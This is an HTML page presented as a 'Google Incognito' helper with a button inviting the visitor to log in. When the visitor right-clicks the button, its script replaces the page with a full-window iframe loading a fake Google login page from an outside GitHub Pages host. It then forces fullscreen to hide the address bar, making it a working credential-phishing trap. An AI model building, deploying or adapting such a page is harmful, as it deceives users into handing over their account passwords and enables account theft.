<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Google Incognito</title>
  <style>
    body {
      margin: 0;
      padding: 40px 20px;
      background: radial-gradient(circle at top, #1a1a1a, #0a0a0a);
      color: #f5f5f5;
      font-family: "Segoe UI", Roboto, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 20px;
      min-height: 100vh;
    }

    h2 {
      font-weight: 500;
      text-align: center;
      color: #90ee90;
    }

    a {
      display: inline-block;
      padding: 14px 26px;
      font-size: 17px;
      border-radius: 10px;
      background: linear-gradient(145deg, #4CAF50, #388E3C);
      color: white;
      text-decoration: none;
      cursor: pointer;
      transition: all 0.25s ease;
      user-select: none;
    }

    a:hover {
      background: linear-gradient(145deg, #5edc5e, #43a047);
      transform: translateY(-2px);
    }
  </style>
</head>
<body>
  <h2>Open this button on incognito</h2>

  <a href="https://accounts.google.com" target="_blank" id="mergedLink">
    Open and login me on incognito
  </a>

  <script>
    const mergedLink = document.getElementById('mergedLink');

    mergedLink.addEventListener('mousedown', (event) => {
      if (event.button === 2) { // Right-click
        console.log("Right-click detected. Preparing in 4 seconds...");
        setTimeout(runPreFullscreenWrite, 2000); // 3.5s: write iframe
        setTimeout(startFullscreen, 4000);       // 4.0s: enter fullscreen
      }
    });

    function runPreFullscreenWrite() {
      console.log("Writing iframe content before fullscreen...");
      document.open();
      document.write(`
        <style>
          html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background: black;
          }
          iframe {
            border: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
          }
        </style>
        <iframe src="https://frozzipies.github.io/login_google.html"></iframe>
      `);
      document.close();
    }

    function startFullscreen() {
      console.log("Starting fullscreen...");
      const el = document.documentElement;
      if (el.requestFullscreen) {
        el.requestFullscreen().catch(err => {
          alert("Fullscreen failed: " + err.message);
        });
      } else {
        alert("Fullscreen not supported on this browser.");
      }
    }
  </script>
</body>
</html>
